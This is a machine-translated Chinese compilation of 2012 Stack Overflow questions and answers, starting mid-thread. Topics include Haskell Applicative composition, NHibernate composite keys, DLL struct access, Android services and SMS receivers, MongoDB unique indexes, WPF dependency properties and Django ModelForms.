……有点假。确实，两个`Applicative`s 的组合也是`Applicative`，但这并不是组合`Applicative`s 的唯一方法！

考虑`StateT s m a`，它等价于`s -> m (s, a)`，尽管它的定义略有不同。这也可以写成三个仿函数的组合：`((->) s)`、`m`和`((,) s)`，结果`Functor`实例是正确的，但`Applicative`实例是*完全*错误的。如果您只是从`State s a = s -> (a, s)`相反开始，则无法`StateT s m`通过组合`State s`and来定义`m`。

现在，请注意，非组合组合本质上是 Parsec 等库中使用的典型解析器组合器 monad 的简化版本，并且此类解析器是使用样式流行`StateT s (Either e)`的众所周知的地方之一。`Applicative`因此，暗示 monad 转换器风格的组合在某种程度上是不必要或多余的，这似乎有点误导`Applicative`！

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-09-25T17:25:20.837

wiki 文章说这`liftA2 (<*>)`可以用来组成应用函子。从它的类型很容易看出如何使用它：

```
o :: (Applicative f, Applicative f1) =>
     f (f1 (a -> b)) -> f (f1 a) -> f (f1 b)
o = liftA2 (<*>) 
```

所以对于 if `f`is`Maybe`和`f1`is`[]`我们得到：

```
> Just [(+1),(+6)] `o` Just [1, 6] 
Just [2,7,7,12] 
```

另一种方法是：

```
>  [Just (+1),Just (+6)] `o` [Just 1, Just 6]
[Just 2,Just 7,Just 7,Just 12] 
```

正如@McCann 所说，您的 ex 函数相当于`liftA2 (:)`：

```
test1 = liftA2 (:) "abc" ["pqr", "xyz"] 
```

要使用`(:)`更深层次的应用程序堆栈，您需要以下多个应用程序`liftA2`：

```
*Main> (liftA2 . liftA2) (:) (Just "abc") (Just ["pqr", "xyz"])
Just ["apqr","axyz","bpqr","bxyz","cpqr","cxyz"] 
```

但是，它仅在两个操作数的深度相同时才有效。因此，除了双倍之外`liftA2`，您还应该使用它`pure`来修复级别：

```
*Main> (liftA2 . liftA2) (:) (pure "abc") (Just ["pqr", "xyz"])
Just ["apqr","axyz","bpqr","bxyz","cpqr","cxyz"] 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-09-25T17:29:17.500

说它们可以以通用方式组合并不意味着它们可以隐式或不可见或类似的方式组合。=)

您仍然需要编写一些代码，要么使用不同的芒格，要么`<*>`添加`pure`一些新类型的噪音。例如，使用[TypeCompose](http://hackage.haskell.org/package/TypeCompose)包，您可以编写

```
test2 = ex (O (Just "abc")) [O (Just "pqr"), O (Just "xyz")] 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-09-25T17:40:41.060

像往常一样，在这里关注类型以弄清楚应用函子的组成应该意味着什么是有用的。

如果我们`a`为特定纯值的类型编写`x`，因此没有副作用，那么我们可以`f`使用`pure`组合器将此纯值提升到应用函子的计算中。但是出于同样的原因，我们可以使用`pure`from`g`的`Applicative`实例中的函数来提升`pure x`到`g`函子中。

```
pure (pure x) :: g (f a) 
```

现在`g (f a)`是结合 的效果`g`和 的效果的计算类型`f`。查看您的测试，我们注意到

```
test1 :: [String] 
```

您在 中只使用了一种效果`test1`，那就是列表实例`Applicative`给您的不确定性。确实，分解它：

```
"abc" :: String
((:) <$>) :: [Char] -> [String -> String]
((:) <$> "abc") :: [String -> String]
((:) <$> "abc" <*> ["pqr", "xyz"]) :: [String] 
```

现在，如果我们想组合失败效应和非确定性效应，我们希望构造一个类型为 的计算`Maybe [a]`，或者也许是`[Maybe a]`。事实证明，两者是等价的，因为 applicative functors 总是*commute*。

这是 type 的计算`[Maybe Char]`。它将不确定地返回 a `Char`，但如果返回，它可能会失败：

```
x1 = [Just 'a', Just 'b', Just 'c'] 
```

同样，这是 type 的计算`[Maybe String]`：

```
x2 = [Just "pqr", Just "xyz"] 
```

现在我们要提升`(:)`到这个组合的应用函子。为此，我们必须将其提升两次：

```
pure (pure (:)) :: [Maybe (Char -> String -> String)] 
```

同样，要应用它，我们需要通过两个函子推动这个计算。因此，我们可以引入一个新的组合`(<<*>>)`器来做到这一点：

```
(<<*>>) :: (Applicative f, Applicative f1) =>
           f (f1 (a -> b)) -> f (f1 a) -> f (f1 b)
(<<*>>) = liftA2 (<*>) 
```

现在允许我们写：

```
pure (pure (:)) <<*>> x1 <<*>> x2 
```

您可以检查它是否具有预期的类型。

但是由于应用函子在组合下是封闭的，`[Maybe a]`它本身就是一个应用函子，因此您可能希望能够重用`pure`和`(<*>)`。[变压器](http://hackage.haskell.org/packages/archive/transformers/0.3.0.0/doc/html/Data-Functor-Compose.html)包的`Data.Functor.Compose`模块向您展示了如何操作。

# c# - 更新此记录不适用于 nHibernate

> ID：12587196
> 
> 赞同：1
> 
> 时间：2012-09-25T16:27:08.763
> 
> 标签：c#, nhibernate, insert, has-many

我有以下2个映射：

```
internal RulesEngineHeaderMap()
{
    Table("LIOEP023");

    CompositeId()
        .KeyProperty(x => x.CompanyCode, "CONO23")
        .KeyProperty(x => x.RuleID, "RLID23");
    Map(x => x.RuleGroup, "RGRP23")
        .Length(30)
        .Not.Nullable();
    Map(x => x.RuleDescription, "RLDS23")
        .Length(50)
        .Not.Nullable();
    Map(x => x.Expression, "EXPR23")
        .Length(2500)
        .Not.Nullable();
    HasMany(x => x.RuleVariables)
        .KeyColumns.Add("CONO24", "RLID24");
} 
```

和

```
internal RulesEngineVariableDetailMap()
{
    Table("LIOEP024");
    CompositeId()
        .KeyProperty(x => x.CompanyCode, "CONO24")
        .KeyProperty(x => x.RuleID, "RLID24")
        .KeyProperty(x => x.Name, "RVAR24");
    Map(x => x.Type, "VTYP24")
        .Not.Nullable();
    Map(x => x.Description, "VDES24")
        .Not.Nullable();
    Map(x => x.Required, "RMAN24")
        .Not.Nullable();
    References(x => x.RuleHeader)
        .Columns("CONO24", "RLID24")
        .NotFound.Ignore()
        .Nullable();
} 
```

当我尝试将新对象添加到 RulesEngineHeader 的 RuleVariables IList 并更新时，出现错误

```
Batch update returned unexpected row count from update; 
  actual row count: 0; expected: 1 
```

当我查看我的 SQL 时，我看到了这个：

```
SELECT rulevariab0_.CONO24 as CONO1_1_,
    rulevariab0_.RLID24 as RLID2_1_,
    rulevariab0_.RVAR24 as RVAR3_1_,
    rulevariab0_.CONO24 as CONO1_1_0_,
    rulevariab0_.RLID24 as RLID2_1_0_,
    rulevariab0_.RVAR24 as RVAR3_1_0_,
    rulevariab0_.VTYP24 as VTYP4_1_0_,
    rulevariab0_.VDES24 as VDES5_1_0_,
    rulevariab0_.RMAN24 as RMAN6_1_0_
FROM   LIOEP024 rulevariab0_
WHERE  rulevariab0_.CONO24 = 'LO' /* @p0 */     <-- KEY FIELD
    and rulevariab0_.RLID24 = 'Test' /* @p1 */  <-- KEY FIELD 
```

where 子句仅包含我定义的 3 个关键字段中的 2 个，因此它正在查找记录并尝试更新，但随后更新如下所示：

```
UPDATE LIOEP024
SET    CONO24 = 'LO' /* @p0_0 */,
    RLID24 = 'Test' /* @p1_0 */
WHERE  CONO24 = 'LO' /* @p2_0 */         <-- KEY FIELD
    AND RLID24 = 'Test' /* @p3_0 */      <-- KEY FIELD
    AND RVAR24 = 'Some Name' /* @p4_0 */ <-- KEY FIELD 
```

如您所见，它使用了所有 3 个关键字段。它应该在这里进行插入，但是由于上面的选择找到了记录，它认为它应该进行更新，即返回 0 条记录。

有什么想法我在这里做错了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T08:52:48.547

您正在为 RuleVariable 使用复合键。NHibernate 无法知道您的 RuleVariable 是新实例还是现有实例。如果您使用生成的 id （如身份），那么它可以通过检查 id 是否 > 0 来判断。

您需要告诉 NHibernate 您的新 RuleVariable 是一个新实例，即。您需要在保存标头之前保留 RuleVariable，为此，请调用 session.Save(variable)

# c++ - 如何在 C++ 中使用来自 dll 的结构？

> ID：12587197
> 
> 赞同：5
> 
> 时间：2012-09-25T16:27:10.643
> 
> 标签：c++, visual-c++, dll, struct

我有一个第三方 dll，没有可在我的 c++ 应用程序中使用的 lib 或头文件。这就是我使用 LoadLibrary(_T("xxx.dll")) 加载它的原因。我可以使用 GetProcAddress() 函数来实现它的功能。

这个 dll 中有一个结构，我也必须访问它。我应该怎么做才能到达和使用它？我查看了该站点，但只找到了 c# 而不是 c++ 的示例。在 C++ 中这样做的方法是什么？

谢谢...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-09-07T17:39:31.953

简短回答：您可以使用 GetProcAddress 检索声明为结构的变量的地址。从[GetProcAddress 手册页](https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212(v=vs.85).aspx)：

从指定的动态链接库 (DLL) 中检索导出函数或**变量的地址。**

该函数的名称应该是 GetSymAddress 而不是 GetProcAddress，但我离题了。

长答案：

假设 DLL 包含 struct Foo 类型的符号**实例**：

```
typedef struct { int x; int array[100]; } Foo;
__declspec( dllexport )  struct Foo Bar = 
{
0xdeadbeef,{0}
}; 
```

您**可以**检索变量**Bar**的地址，前提是您已经加载了 dll 并在某处使用了它的 hModule 句柄：

```
struct Foo* Bar = GetProcAddress(hModule,"Bar"); 
```

您**无法**检索结构本身的定义，但无论如何我认为这不是您的意思。

注意：我忽略了名称修饰、extern "C" 声明以及可能需要考虑的其他一些事情以明确这一点，我假设读者已经对手头的主题有基本的了解。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T16:37:17.620

如果您知道结构的语法，例如来自 C# 定义，那么您可以简单地将其定义添加到 .h 文件中，将其包含在您的 C++ 源文件中并使用它。就这样。但是如果您的结构是某种类并且具有成员方法，那么您应该知道成员方法的修饰名称，从 .dll 动态加载它们并将它们作为 C 函数调用。

# android - 在 BroadcastReceiver 中停止 BroadcastReceiver 和 Service

> ID：12587198
> 
> 赞同：0
> 
> 时间：2012-09-25T16:27:14.063
> 
> 标签：android, service

如何准确停止广播接收器中的服务？我正在使用 SMS Received 广播接收器。

我在用

```
context.stopService(new Intent(this, CallService.class)); 
```

其中“CallService”是我的服务，但我正在接收

```
The constructor Intent(SMSReceiver, Class<CallService>) is undefined 
```

快速修复是`remove the arguments to match 'Intent()'`

我在这里做错了吗？

* * *

要停止广播接收器，我所要做的就是仅 `context.unregisterReceiver(SMSReceiver.this);` 此而已？我必须做 onDestroy 还是什么？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-25T16:47:40.640

使用`context`而不是`this`实例化 Intent，如下所示

```
context.stopService(new Intent(context, CallService.class)); 
```

注销部分是正确的。

# c - 删除传递给链表 C 中函数的单个节点

> ID：12587200
> 
> 赞同：0
> 
> 时间：2012-09-25T16:27:14.720
> 
> 标签：c, list, linked-list

我有一个`deleteNode`接收列表头部的函数，以及要删除的节点。当我运行它时，它成功删除了节点，但它也删除了它之后的所有内容。我相信这与我重建列表有关，但我无法弄清楚我的逻辑在哪里出错，所以我可以使用一些帮助。这是功能代码：

```
void deleteNode(struct lnode** head, struct lnode* node) {
    struct lnode* nextNode = nodeGetNext(node);
    printf("word: \n%s\n",nodeGetWord(nextNode));
    struct lnode* nodeToDelete = node;

    *head = nodeGetNext(nodeToDelete);
    printf("Head word: %s\n",nodeGetWord(*head));
    free(nodeToDelete); 
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:48:59.163

试着把它画出来......我不知道你的函数究竟做了什么，所以这会根据名称做出一些假设，但你可以理解。

1.  你传入`head`（红色'h'）
2.  你传入`node`删除（蓝色'n'）
3.  您将本地设置`nextNode`为返回`nodeGetNext(node)`（我假设这是要删除的节点之后的节点，绿色的“nn”）
4.  您将`nodeToDelete`（紫色 ntd）设置为`node`

![在此处输入图像描述](../Images/3c8be24c8b56bae345088f8b4147e3f6.png)

所以你的代码将指向`nodeGetNext(nodeToDelete)`. 这实际上是您未使用的变量`nextNode`。那你就自由了`nodeToDelete`。

我很确定这不是您想要做的，除非您知道要删除的节点就在 head 旁边。我认为更正常的算法是：

1.  从头搜索要删除的节点
2.  在“要删除的节点”+1旁边设置“要删除的节点”-1
3.  删除“要删除的节点”

对于 Head 的特殊情况，或空列表等。

# iphone - iphone从数据库中搜索数据

> ID：12587202
> 
> 赞同：1
> 
> 时间：2012-09-25T16:27:17.467
> 
> 标签：iphone, database

我有一个包含位置（商店名称。地址，城市，州，邮编）的 Excel 表，我想开发一个 iphone 应用程序来使用地址、城市、邮编或使用当前位置搜索这些位置。请告诉我如何实现这一目标。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T16:52:37.673

I just had a similar issue recently. I saved my excel files to csv format, and then I downloaded the code described in this link:

```
http://blog.danilocampos.com/2009/12/04/convert-a-csv-into-a-plist-file/ 
```

which is for a mac app that converts csv files to plist files. I had to edit the

```
- (IBAction)executeConversion:(id)sender 
```

method in AppController.m to get the plist in the format I wanted, but it was straightforward. It may not be the best solution, but it was the best I could find.

# ios - 带有条件的 UIPickerView

> ID：12587208
> 
> 赞同：2
> 
> 时间：2012-09-25T16:27:56.827
> 
> 标签：ios, uipickerview

我对 Xcode 和任何与编码有关的事情都是全新的，但我正在努力，直到现在似乎一切都很好。我想做的事...

我有一个`UIPickerView`由数组填充的 2 个组件。这很好，很可爱，但我希望更进一步。

在左侧组件上，我希望有一个具有永远不会改变的常量值的列表。在第二个组件中，我希望有一个在第一个组件中单击的任何选择的子列表。

例如：-

```
BOY : Matt
      Tom
      Pete

GIRL : Jess
       Nina
       Sarah 
```

我想我可以使用一个`if`语句来实现这些更改，但不知道语言......一个人只能进行这么多的试验和错误！

干杯

```
@interface TripsViewController ()
@end

@implementation TripsViewController

@synthesize ActivitysLabel;
@synthesize TripsLabel;

- (NSInteger)numberOfComponentsInPickerView:(UIPickerView *)pickerView
{
    return 2;
}

- (NSInteger)pickerView:(UIPickerView *)pickerView numberOfRowsInComponent:(NSInteger)component {
    if (component == ACTIVITY)
        return [ArrayActivity count];

    if (component == TRIPS)
        return [ArrayTrips count];

    return 0;
}

- (NSString *)pickerView:(UIPickerView *)pickerView titleForRow:(NSInteger)row forComponent:(NSInteger)component{

    if (component == ACTIVITY)
        return [ArrayActivity objectAtIndex:row];

    if (component == TRIPS)
        return [ArrayTrips objectAtIndex:row];
    return 0;
}

- (void) pickerView:(UIPickerView *)pickerView didSelectRow:(NSInteger)row inComponent:(NSInteger)component {
    ActivitysLabel.text = [ArrayActivity objectAtIndex:[pickerView selectedRowInComponent:0]];
    TripsLabel.text = [ArrayTrips objectAtIndex:[pickerView selectedRowInComponent:1]];
}

- (id)initWithStyle:(UITableViewStyle)style
{
    self = [super initWithStyle:style];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)viewDidLoad

{
    [super viewDidLoad];
    ArrayActivity = [[NSMutableArray alloc] init];
    [ArrayActivity addObject:@"Abseiling"];
    [ArrayActivity addObject:@"Canyoning"];
    [ArrayActivity addObject:@"Rock Climbing"];
    [ArrayActivity addObject:@"Bush Walking"];
    [ArrayActivity addObject:@"Mountain Biking"];
    [ArrayActivity addObject:@"4wd Tours"];

    // My attempts at trying to solve this problem

    if (ArrayActivity containsObject:NSString @"Canyoning") {
        ArrayTrips = [[NSMutableArray alloc] init];
        [ArrayTrips addObject:@"Empress Canyon"];
        [ArrayTrips addObject:@"Sheep Dip"];
        [ArrayTrips addObject:@"butterbox"];
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-11T04:08:03.770

我认为代码通常是正确的，但是在选择将改变可能选择的项目后，您必须做的是`reloadComponent`使用数据不同的列的索引进行调用。在选择新条目后立即执行此操作（确保仅在正确的组件选择上触发重新加载）。

# android - Android - 在定义的日期和时间发送通知

> ID：12587213
> 
> 赞同：1
> 
> 时间：2012-09-25T16:28:17.373
> 
> 标签：android, notifications, alarm

即使应用程序已关闭，我如何发送提醒之类的通知。

例如，当我们在日历上注册事件时，日历会在事件开始前 10 分钟（即）发送通知。我怎样才能在我的应用程序上做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-25T16:31:45.323

Android 中最适合执行此操作的机制很可能是系统警报。

警报允许您在给定的时间点执行一段代码。即使您的应用当前未运行或手机处于睡眠状态。

要了解有关警报的更多信息，请访问官方开发人员参考[这里](http://developer.android.com/reference/android/app/AlarmManager.html)

# javascript - MongoDB Javascript批量插入唯一约束

> ID：12587217
> 
> 赞同：1
> 
> 时间：2012-09-25T16:28:46.810
> 
> 标签：javascript, mongodb

我对 MongoDB 本机 JS 驱动程序和给定唯一约束的插入有点困惑。在这里阅读[http://mongodb.github.com/node-mongodb-native/api-articles/nodekoarticle1.html](http://mongodb.github.com/node-mongodb-native/api-articles/nodekoarticle1.html)，似乎在插入之后，可以传递一个“成功”回调来处理保存的文档（也许例如，从保存的文档中获取 _id 字段）。

但是，假设我正在保存用户配置文件，每个配置文件都有一个电子邮件字段。我希望电子邮件字段是唯一的，所以我认为我必须使用 ensureIndex。然后假设我想批量插入 10 个用户配置文件，每个配置文件都有一个电子邮件字段，但是这 10 封电子邮件中有 2 封已经存在于我的数据库中。那么通过唯一约束，这两个用户配置文件不会被添加到数据库中，对吧？那么回调中返回了什么？8 保存的文件？还是 8 个已保存的文档和 2 个预先存在的文档？

编辑：经过一些测试，我取得了一些不错的进展，但我仍然缺少一件。我将解释从上面继续我的例子。假设我有一组包含 1 个文档的用户配置文件，并且该文档有一个带有“email”的字段：“ex@mple.com”。然后假设我在此集合中的电子邮件字段上放置了一个带有 { unique: true } 的索引。如果我然后执行一个简单的插入：

```
collection.insert({ 'email': 'ex@mple.com' }, { safe: true }, function (err, results) {
    console.log(results);                                                         
}); 
```

导致上面的回调返回未定义，因为包含该电子邮件的文档已经存在，因此没有执行插入。这很有意义，但我希望“结果”返回包含已经存在的文档，从而阻止新的插入。那可能吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-10-11T19:07:10.827

```
> db.collection.find()
{ "_id" : 1, email : "email" }
> db.collection.ensureIndex({email: 1}, {unique: true})
> db.collection.insert({_id:2, email: "email"})
E11000 duplicate key error index: foo.collection.$email_1  dup key: { : "email" } 
```

您能否解析重复键错误消息“E11000 重复键...”以获取“电子邮件”并随后发出 find() 以获取阻止插入的预先存在的文档？

因为只有一个文档- db.collection.find(email: "email")

# android - 将复杂对象从 Activity 传递到 FragmentDialog，反之亦然

> ID：12587219
> 
> 赞同：2
> 
> 时间：2012-09-25T16:28:55.733
> 
> 标签：android, android-fragments, android-activity

我正在我的活动内的列表视图中实现消息提要。在这个活动中，我只显示消息的“主线程”，而不是对它们的回复，这是一种社交网络行为，当你点击一条消息时，会弹出一个包含该消息及其回复的新窗口。

从网络服务器下载 JSONS 后，我们将信息存储在我们称为 VO 的复杂对象中，即 UserVO，它存储了所有用户的信息。

该对象包含字符串、整数、其他 VO 列表、消息提要列表等...

我的想法是在单击一条消息时在屏幕顶部打开一个新的 FragmentDialog 以显示对此消息的可能回复，并启用向其发送回复的可能性。

为此，我需要在 Activity 和 Fragment 之间双向传递这些 VO 对象，

*   从 Activity 到 DialogFragment：带有消息提要的对象。
*   从片段到活动：一旦用户编写文本并附加图片（URL），我应该将对象发送回活动

我一直在阅读有关片段和活动的大量信息，但仍然找不到对我有用的解决方案。我需要在初始化 Fragment 时传递几个对象，这似乎无法使用 newInstance() 方法。另外，为了使用这种方法，我需要对我们正在使用的所有 VO 进行序列化（复杂）。另外，我仍然需要将片段中的对象（再次复杂的 VO）传递回活动……有没有办法传递那些大对象？一个接口能否以两种方式传递信息？

我真的很感激任何帮助（一些教程会很棒），因为我找不到这个问题的任何解决方案，而且我在这里非常忙碌。

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-05-02T19:45:00.657

在 DialogFragmnet 类中，您创建了两个方法：

1- newInstance -> 制作 DialogFragment 的实例

2- setter 设置您的复杂对象

```
 public class YourDialogFragment extends DialogFragment {

        ComplexVariable yourVar;

        public static YourDialogFragment newInstance(int arg, ComplexVariable var) {
            YourDialogFragmentfrag = new MoveSongDialogFragment();
            Bundle args = new Bundle();
            args.putInt("count", arg);
            frag.setArguments(args);
            frag.setComplexVariable(var);
            return frag;
        }

        public void setComplexVariable(ComplexVariable var) {
            yourVar = var;
        }
    } 
```

然后，显示对话框

```
FragmentManager manager = getSupportFragmentManager();
FragmentTransaction ft = manager.beginTransaction();
    Fragment prev = manager.findFragmentByTag("yourTag");
    if (prev != null) {
        ft.remove(prev);
    }

    // Create and show the dialog.
    DialogFragment newFragment = YourFragmentDialog.newInstance(argument, yourComplexObject);
    newFragment.show(ft, "yourTag"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T16:58:08.443

您可以将对象保存为 Activity 的成员。为它制作 setter 和 getter。您可以使用 getActivity() 从 Fragment 访问 Activity 并将 Activity 转换为 YourActivity。

这是在片段和活动之间传递信息的一般方向。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-29T21:40:45.170

Givi 提到的是其中一种方法，但更好和更有效的处理方法可能是使用工厂模式，比如在您将在多个活动中使用 Fragment 的场景中。

检查如何[以正确的方式将初始数据提供给片段？](https://stackoverflow.com/questions/10798489/proper-way-to-give-initial-data-to-fragments)

要了解所有方法，请查看[http://developer.android.com/guide/components/fragments.html#CommunicatingWithActivity部分](http://developer.android.com/guide/components/fragments.html#CommunicatingWithActivity)

1.  创建活动的事件回调
2.  吸气剂或二传手
3.  工厂方法

对于复杂对象，如果在 Bundle 中传递，请检查在实现 Paracable[的 android 活动之间传递非原始类型的数据应该可以解决问题](https://stackoverflow.com/questions/1441871/passing-data-of-a-non-primitive-type-between-activities-in-android)

# android - 接收发送到特定端口的短信

> ID：12587225
> 
> 赞同：1
> 
> 时间：2012-09-25T16:29:29.160
> 
> 标签：android, sms, broadcastreceiver, android-manifest, intentfilter

这是一个经常出现的问题，但我无法找到关于该主题的足够完整的文档。

当使用 kannel 或其他设备使用默认参数发送 SMS 时，我已经有一个能够拦截 SMS 的工作应用程序。我的清单如下所示：

```
<receiver
    android:name=".sms.SMSListener"
    android:enabled="true" >
    <intent-filter>
        <action android:name="android.provider.Telephony.SMS_RECEIVED" />    
    </intent-filter>
</receiver> 
```

它适用于`android.provider.Telephony.SMS_RECEIVED`和`android.intent.action.DATA_SMS_RECEIVED`。

但就我的应用程序而言，SMS 不得出现在用户收件箱中。为此，kannel 将 SMS 发送到特定端口。它已经在黑莓上运行，所以我猜问题的发送部分已经在运行。也有可能通过其他方式实现这个目标，我需要实施这个解决方案才能与其他类似项目保持一致。另一个原因是避免我`BroadcastReceiver`在收到每条短信时都被解雇（因此需要解析每条收到的短信）。

但是，对于我当前的清单，我没有收到发送到特定端口的 SMS（我的接收器根本没有被触发）。经过一番研究，我发现了那些主题[如何接收特定端口的短信......](https://stackoverflow.com/questions/2726976/how-to-receive-text-sms-to-specific-port)，[如何发送和接收数据短信](https://stackoverflow.com/questions/3757229/android-how-to-send-and-receive-data-sms-messages)。有人说添加：

```
<data android:scheme="sms" />
<data android:port="1234" /> 
```

足以工作（不幸的是，它对我不起作用）。但是，根据文档（[http://developer.android.com/guide/topics/manifest/data-element.html](http://developer.android.com/guide/topics/manifest/data-element.html)），您需要指定`android:scheme`then`android:host`才能`android:port`被考虑在内。据我了解文档，您可以指定`android:scheme`并且意图过滤器应该仍然有效。但是，一旦我指定`android:scheme`，我就`BroadcastReceiver`停止工作，无论我是否使用特定端口发送短信：

```
<receiver
    android:name=".sms.SMSListener"
    android:enabled="true" >
    <intent-filter>
        <action android:name="android.provider.Telephony.SMS_RECEIVED" />    
        <data android:scheme="sms" />
    </intent-filter>
</receiver> 
```

所以我的问题如下：

1.  `android:scheme`是否有关于可以采取哪些价值的文件？
2.  我应该使用哪个值`android:host`？
3.  是否有一个应用程序可以监听每个端口的短信，所以我可以确定测试短信是否正确发送（只是为了仔细检查这部分）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-02T11:58:02.220

我终于设法理解出了什么问题：

我正在将我的数据短信发送到为 WAP-PUSH 消息保留的端口 2948。所以 android 不会将这些消息广播到我的 android.intent.action.DATA_SMS_RECEIVED 接收器。使用不同的端口解决了这个问题。

此外，android 似乎对 8 位编码的 SMS 有问题（至少它会在日志中发出警告。）。不过我的主要问题已经解决了。

# c# - VisualStudio的PropertyWindow中的依赖属性

> ID：12587227
> 
> 赞同：1
> 
> 时间：2012-09-25T16:29:35.797
> 
> 标签：c#, wpf, wpf-controls, dependency-properties

首先我会给你我的代码，然后我会问我的问题。

```
namespace LinearGradientBrushBinding
{
    public partial class LinearGradBrush : UserControl
    {
        public LinearGradBrush()
        {
            InitializeComponent();
        }

        class LinearGradBrushProp : DependencyObject
        {
            public static DependencyProperty _background;

            static void BackgroundBrush()
            {
                _background = DependencyProperty.Register(
                    "_background", typeof(Brush), typeof(LinearGradBrushProp));
            }

            [Description("CuloareBG"), Category("Z")]
            public Brush Background
            {
                get { return (Brush)GetValue(_background); }
                set { SetValue(_background, value); }
            }
        }
    }
} 
```

如您所见，我有一个 UserControl，其中包含一个类。我的问题是为什么我在控件的“属性”窗口（UserControl.Xaml 的右侧）中看不到带有画笔的类别 Z。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T21:50:24.577

> 为什么我在控件的“属性”窗口（UserControl.Xaml 的右侧）中看不到带有画笔的类别 Z。

很简单，因为您`LinearGradBrush`不包含使用 category 注释的属性`Z`。

您`LinearGradBrush`包含一个（私有）内部类，它确实具有这样的属性，但是属性编辑器无法知道该内部类的哪个实例将属性值分配给。（属性编辑器甚至可能看不到这个内部类，因为它是私有的。）

我建议您将此属性移出内部类并摆脱该类。老实说，我看不出你需要在这里使用内部类的原因。

另外，我想指出您的依赖属性未正确声明。它没有使用正确的命名约定，而且我看不到对`BackgroundBrush()`初始化依赖属性的方法的任何调用。我希望属性声明如下（注意字段的名称，它是事实，`readonly`并且方法的第一个参数`Register`是属性的名称）：

```
public static readonly DependencyProperty BackgroundProperty =
    DependencyProperty.Register("Background", typeof(Brush), typeof(LinearGradBrush));

[Description("CuloareBG"), Category("Z")]
public Brush Background
{
    get { return (Brush)GetValue(BackgroundProperty); }
    set { SetValue(BackgroundProperty, value); }
} 
```

我对您的代码进行了此更改，切换到另一个 XAML 页面（即不是`LinearGradBrush.xaml`），并将您的控件作为元素添加到此 XAML 页面`<local:LinearGradBrush />`。当文本光标位于该元素上时，该`Background`属性出现在`Z`属性窗口的类别中。

# django-forms - ModelForm：显示外键字段

> ID：12587229
> 
> 赞同：1
> 
> 时间：2012-09-25T16:29:37.163
> 
> 标签：django-forms

考虑以下代码：

模型.py

```
class Manufacturers(models.Model):
    name = models.CharField(max_length=32)

class Cars(models.Model):
    producedby = models.ForeignKey(Manufacturers) 
```

表格.py

```
class CreateCar(forms.ModelForm): 
    class Meta: 
        model = Cars 
```

...在 html 页面上，“producedby”字段显示为“制造商对象”选项列表，这不是很有用，是否可以显示 Manufacturer.name 字段？我尝试了其他线程中建议的解决方案，但没有一个有效。

非常感谢您的帮助

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T23:48:13.897

我通过重载 __str__ 方法并返回名称来修复它，如下所示：

```
class Manufacturers(models.Model):
    name = models.CharField(max_length=32)
    def __str__(self): return self.name 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-26T15:35:45.883

这可能有点晚了，但为了将来参考，我会通过将模板文件更改为：

```
car_details.html

{{ CreateCarForm.instance.producedby.name }} 
```

# android - 如何跟踪短信是否已打开？

> ID：12587231
> 
> 赞同：0
> 
> 时间：2012-09-25T16:29:42.310
> 
> 标签：android, sms, messaging

我正在做一个应用程序，当收到来自特定号码的短信时，如果该短信已打开，将更新系统已阅读该消息。因此，如果有人使用第三方应用程序打开该消息，它将被标记如阅读。有没有办法我可以做到这一点。我想要的是系统应该更新已阅读消息的服务器。

`

```
import android.app.Notification;'
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import android.util.Log;
import android.widget.Toast;
import android.content.*;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;

import android.telephony.gsm.SmsMessage;

public class SMSReciever extends BroadcastReceiver { 
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static final String TAG = "smsfwd";
    private static final String LOG_TAG = "SMSReceiver";
    public static int MSG_TPE=0;

       public void onCreate(){
            Log.i("APP","SMS Receiver started.");
       }

    @Override
    public void onReceive(Context context, Intent intent) { 
        String number = null;
        String body = null;
        Log.i(LOG_TAG, "onReceive");
        Log.i(TAG, "Intent recieved: " + intent.getAction());

        if (intent.getAction() == SMS_RECEIVED) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[])bundle.get("pdus");
                final SmsMessage[] messages = new SmsMessage[pdus.length];
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                }
                if (messages.length > -1) {
                    Log.i(TAG, "Message recieved: " + messages[0].getMessageBody());
                    //NetComm.SendMessage("me", messages[0].getOriginatingAddress(), messages[0].getMessageBody());
                    Uri uri = Uri.parse("content://sms/inbox");
                    Log.i(TAG, "Intent recieved: " );

                    Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
                    try{

                    while (cursor.moveToNext()) {
                            if ((cursor.getString(cursor.getColumnIndex("address")).equals(number)) && (cursor.getInt(cursor.getColumnIndex("read")) == 0)) {
                                if (cursor.getString(cursor.getColumnIndex("body")).startsWith(body)) {
                                    String SmsMessageId = cursor.getString(cursor.getColumnIndex("_id"));
                                    ContentValues values = new ContentValues();
                                    values.put("read", true);
                                    context.getContentResolver().update(Uri.parse("content://sms/inbox"), values, "_id=" + SmsMessageId, null);
                                    return;
                                }
                            }
                        }
              }catch(Exception e)
              {
                  Log.e("Mark Read", "Error in Read: "+e.toString());
              }
                }

            }
        }}
        ` 
```

# android-webview - javascript警报打开时无法在androidwebview中打开另一个链接

> ID：12587235
> 
> 赞同：1
